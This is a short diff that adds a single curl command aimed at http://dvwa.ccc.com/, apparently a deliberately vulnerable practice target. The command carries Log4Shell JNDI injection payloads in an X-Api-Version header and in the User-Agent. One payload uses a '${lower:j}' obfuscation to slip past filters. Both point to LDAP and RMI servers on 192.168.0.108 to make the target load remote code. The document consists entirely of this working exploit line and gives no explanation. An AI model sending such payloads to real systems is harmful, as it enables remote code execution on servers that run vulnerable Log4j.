@@ -1,0 +1,5 @@
+curl -i --max-time 15 \
+  -H \
+'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \
+  -A '${jndi:rmi://192.168.0.108:1099/c}' \
+  http://dvwa.ccc.com/
